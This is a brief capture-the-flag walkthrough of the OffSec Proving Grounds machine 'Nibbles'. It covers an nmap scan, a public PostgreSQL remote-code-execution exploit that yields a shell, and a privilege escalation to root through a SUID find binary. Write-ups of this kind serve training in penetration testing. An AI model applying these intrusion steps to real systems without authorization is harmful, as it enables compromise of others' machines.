# Nibbles — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

PostgreSQL RCE exploit → shell as postgres → SUID `find` binary → GTFOBins root.

---

## Enumeration

```bash
nmap -sV -p- 192.168.229.47
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.9p1 Debian |
| 80 | HTTP | Apache 2.4.38 |
| 139/445 | SMB | (closed) |

After rerunning nmap, we also discover a **PostgreSQL** port that was initially filtered. Had to update Kali (`apt update && apt upgrade && apt dist-upgrade`) to get the `psql` client working.

---

## Exploitation — PostgreSQL RCE

Found an RCE exploit for PostgreSQL: [EDB-50847](https://www.exploit-db.com/exploits/50847)

Better yet, there's a polished version on GitHub: [PostgreSQL_RCE](https://github.com/squid22/PostgreSQL_RCE)

```bash
python3 postgresql_rce.py
```

Shell caught as `postgres`.

---

## Privilege Escalation — SUID find

```bash
find / -perm -u=s -type f 2>/dev/null
```

The `find` binary has the SUID bit set. From GTFOBins:

```bash
./find . -exec /bin/sh -p \; -quit
```

**Root.** 🎉

---

## Key Takeaways

- **PostgreSQL** can be exploited for RCE — always check the version and search for exploits
- **SUID `find`** is a direct root path via `-exec` — one of the most common GTFOBins escalations
- Keep your Kali tools updated — broken clients waste time

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
